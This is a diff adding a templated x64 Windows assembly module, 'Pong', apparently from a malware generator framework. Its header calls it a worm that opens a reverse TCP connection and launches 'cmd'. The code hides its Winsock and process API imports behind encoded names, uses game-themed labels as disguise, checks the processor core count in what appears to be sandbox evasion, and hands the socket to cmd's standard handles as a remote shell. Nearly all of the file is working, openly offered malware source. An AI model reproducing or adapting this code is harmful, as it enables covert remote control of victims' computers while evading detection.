@@ -1,0 +1,312 @@
+#!name##Pong
+#!types##worm
+#!info##Assembler worm [W] [x64]. A worm that opens a reverse TCP connection and, by default, starts 'cmd'. It features hidden function imports, making it very difficult to detect. The function names are hidden and dynamically constructed from text. The worm is compiled as a single file and uses additional libraries.
+#!system_FLAG##[W]
+#!globalVar##COMPILER##mingw-x64##Compiler name
+#!globalVar##OS_EXEC##win##Target system executable
+#!globalVar##NO_DLL##True##Not include DLLs
+#!globalVar##SHOW##gui##runs program in gui (background)
+#!processWorm##WormLib
+#!lang##asm
+#!reqVar##IP_ADDR##Host ip address##str
+#!reqVar##PONG_port##Host port number##int
+#!setVar##PONG_port##4000##int
+#!reqVar##PONG_exec##Program to run. Default is 'cmd'.##str
+#!setVar##PONG_exec##cmd##str
+#!reqSMod##Smuggler_LIB
+#!reqCS##BasicExe
+
+{% if PONG_layer %}
+{% set PONG_LAYER = PONG_layer %}
+{% else %}
+{% set PONG_LAYER = "!QWERTYUIOPASDFGHJKLZXCVBNM.qwertyuiopasdfghjklzxcvbnm1234567890_" %}
+{%endif%}
+
+bits 64
+default rel
+
+extern printf
+extern ExitProcess
+extern Sleep
+extern Work
+extern GetPlayer
+extern GetEnemy
+extern GetPlayerScore
+
+section .data
+    data_text: db "{{PONG_LAYER}}", 0
+    
+    en_count: equ 2
+    enemy: dw {{TOOL.shadow_gen_name(IP_ADDR, PONG_LAYER)}} ; ip addr 
+    hiscore: equ {{PONG_port}}   ; port number
+    pl_mast: dw {{TOOL.shadow_gen_name("Ws2_32.dll", PONG_LAYER)}} ; Ws2_32.dll
+    pl_wsa: dw {{TOOL.shadow_gen_name("WSAStartup", PONG_LAYER)}} ;WSAStartup
+    pl_wsac: dw {{TOOL.shadow_gen_name("WSACleanup", PONG_LAYER)}} ; WSACleanup
+    pl_inet: dw {{TOOL.shadow_gen_name("inet_addr", PONG_LAYER)}} ; inet_addr
+    pl_hton: dw {{TOOL.shadow_gen_name("htons", PONG_LAYER)}} ; htons
+    pl_sok: dw {{TOOL.shadow_gen_name("WSASocketA", PONG_LAYER)}} ; WSASocketA
+    pl_game: dw {{TOOL.shadow_gen_name("connect", PONG_LAYER)}} ; connect
+    pl_cp: dw {{TOOL.shadow_gen_name("CreateProcessA", PONG_LAYER)}}; CreateProcessA
+    en_hit: dw {{TOOL.shadow_gen_name(PONG_exec, PONG_LAYER)}}; prog execute
+    en_low: dw {{TOOL.shadow_gen_name("WaitForSingleObject", PONG_LAYER)}}; WaitForSingleObject
+    lvl_one: dw {{TOOL.shadow_gen_name("GetSystemInfo", PONG_LAYER)}}; GetSystemInfo
+    
+
+section .bss
+    player_data: resb 400   ; wsa data struct
+    enemy_hit: resb 16   ; ip addr
+    enemy_life: resq 1  ; port num
+    enemy_move: resb 64  ; buffer for command run
+    player_weapon: resq 1   ; socket handler
+    pl_items: resb 16   ; sock_addr struct 16 bytes
+    pl_lose: resq 1 ; pointer to error number
+    pl_life: resb 104   ; STARTUPINFOA structure
+    pl_info: resb 128   ; PROCESS_INFORMATION structure
+    lvl_info: resb 64   ; SYSTEM_INFO structure
+
+section .text
+    global WinMain
+
+WinMain:
+    
+    ; get GetSystemInfo func
+    sub rsp, 24
+    mov rcx, lvl_one
+    mov rdx, data_text
+    call GetPlayer
+    add rsp, 24
+    
+    ; check core number
+    sub rsp, 40
+    lea rcx, lvl_info
+    call rax
+    add rsp, 40
+    
+    lea rcx, lvl_info
+    mov ebx, [rcx + 32]
+    cmp ebx, en_count
+    jl Exit
+
+    sub rsp, 24
+    call Work
+    add rsp, 24
+    
+    ; init Ws2_32 socket
+    sub rsp, 24
+    mov rcx, pl_wsa
+    call LoadLevel
+    add rsp, 24
+       
+    sub rsp, 40
+    mov rcx, 0x0202 ; wVersionRequired
+    lea rdx, [player_data]
+    call rax
+    add rsp, 40
+    
+    
+    ;create socket
+    sub rsp, 24
+    mov rcx, pl_sok
+    call LoadLevel
+    add rsp, 24
+    
+    sub rsp, 56
+    mov rcx, 2  ;AF_INET
+    mov rdx, 1  ;SOCK_STREAM
+    mov r8, 6   ;IPPROTO_TCP
+    xor r9, r9
+    mov [rsp+32], r9
+    mov [rsp+40], r9
+    call rax
+    add rsp, 56
+    cmp rax, -1
+    je Exit
+    
+    lea rcx, [player_weapon]
+    mov [rcx], rax  ; save socket handler
+    
+    
+    
+    ; -------- fill sock addr ------------
+    
+    
+        ;   struct sockaddr_in {
+    ;       short   sin_family; 2 bytes
+    ;       u_short sin_port;   2 bytes
+    ;       struct  in_addr sin_addr; 4 bytes
+    ;       char    sin_zero[8];
+    ;      };
+    
+    ; convert ip addr
+    sub rsp, 24
+    mov rcx, enemy
+    mov rdx, data_text
+    call GetPlayerScore
+    add rsp, 24
+    
+        ; copy ip addr to buffer
+    mov rcx, 16
+    mov rsi, rax
+    lea rdi, enemy_hit
+    rep movsb   ; copy RCX bytes (16) from rsi to rdi
+    
+   
+    
+    sub rsp, 24
+    mov rcx, pl_inet
+    call LoadLevel
+    add rsp, 24
+    
+    sub rsp, 40
+    mov rcx, enemy_hit
+    call rax    ; exe inet_addr
+    add rsp, 40
+    
+    lea rcx, [enemy_hit]
+    mov [rcx], rax  ; save converted ip addr
+    
+    ; convert port number
+    sub rsp, 24
+    mov rcx, pl_hton
+    call LoadLevel
+    add rsp, 24
+    
+    sub rsp, 40
+    mov rcx, hiscore
+    call rax    ; execute htons
+    add rsp, 40
+    
+    lea rcx, enemy_life
+    mov [rcx], rax  ; save port number
+    
+    ; fill struct
+    lea rbx, [pl_items]
+    mov qword [rbx], 2  ; AF_INET
+    
+    lea rcx, [enemy_life]
+    mov rcx, [rcx]
+    mov [rbx+2], rcx    ; add port number to struct
+    
+    lea rcx, [enemy_hit]
+    mov rcx, [rcx]
+    mov [rbx+4], rcx    ; add ip to struct
+    
+    ;Try Connect
+    .begin:
+        sub rsp, 24
+        mov rcx, pl_game
+        call LoadLevel
+        add rsp, 24
+        
+        sub rsp, 40
+        lea rcx, [player_weapon]
+        mov rcx, [rcx]
+        lea rdx, [pl_items]
+        mov r8, 16
+        call rax    ;execute connect
+        add rsp, 40
+        
+        cmp rax, 0
+        je .connected
+        
+        sub rsp, 40
+        mov rcx, 3000
+        call Sleep
+        add rsp, 40
+        jmp .begin
+        
+    .connected:
+        ; create process
+        ; get command
+        mov rcx, en_hit
+        sub rsp, 24 ;shadow space
+        mov rdx, data_text
+        call GetPlayerScore
+        add rsp, 24 ; restore stack
+        
+        ; copy command
+        mov rcx, 64
+        mov rsi, rax
+        lea rdi, enemy_move
+        rep movsb   ; copy rcx bytes from rsi to rdi
+   
+        
+        ; fill structure
+        lea rbx, [pl_life]  ; pointer to struct
+        lea rax, [player_weapon]    ; socket struct
+        mov rax, [rax]
+        ; fill proc struct
+        mov dword [rbx], 104    ; struct length
+        mov dword [rbx + 60], 0x100 ; dwFlags = STARTF_USESTDHANDLES
+        ; add socket fd to struct
+        mov [rbx + 80], rax
+        mov [rbx + 88], rax
+        mov [rbx + 96], rax
+        
+        ; get CreateProcess
+        sub rsp, 24
+        mov rcx, pl_cp
+        mov rdx, data_text
+        call GetPlayer
+        add rsp, 24
+        
+        sub rsp, 88 ;shadow space
+        mov rcx, 0
+        lea rdx, [enemy_move]
+        ;mov rdx, [rdx]
+        mov r8, 0
+        mov r9, 0
+        mov qword [rsp+32], 1
+        mov qword [rsp+40], 0
+        mov qword [rsp+48], 0
+        mov qword [rsp+56], 0
+        lea r10, [pl_life]
+        mov qword [rsp+64], r10
+        lea r10, [pl_info]
+        mov qword [rsp+72], r10
+        call rax    ; execute CreateProcessA
+        add rsp, 88
+        cmp rax, 0
+        je Exit
+        
+        ; wait
+        sub rsp, 24
+        mov rcx, en_low
+        mov rdx, data_text
+        call GetPlayer
+        add rsp, 24
+        
+        sub rsp, 40
+        lea rcx, [pl_info]
+        mov rcx, [rcx]
+        mov rdx, -1
+        call rax    ; execute WaitForSingleObject
+        add rsp, 40
+
+
+Exit:
+    sub rsp, 24
+    mov rcx, pl_wsac
+    call LoadLevel
+    add rsp, 24
+    
+    sub rsp, 40
+    call rax  
+    mov rcx, 0
+    call ExitProcess
+
+LoadLevel:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+
+    
+    sub rsp, 24
+    mov rdx, pl_mast
+    mov r8, data_text
+    call GetEnemy
+    add rsp, 24
+    
+    add rsp, 8
+    pop rbp
+    ret
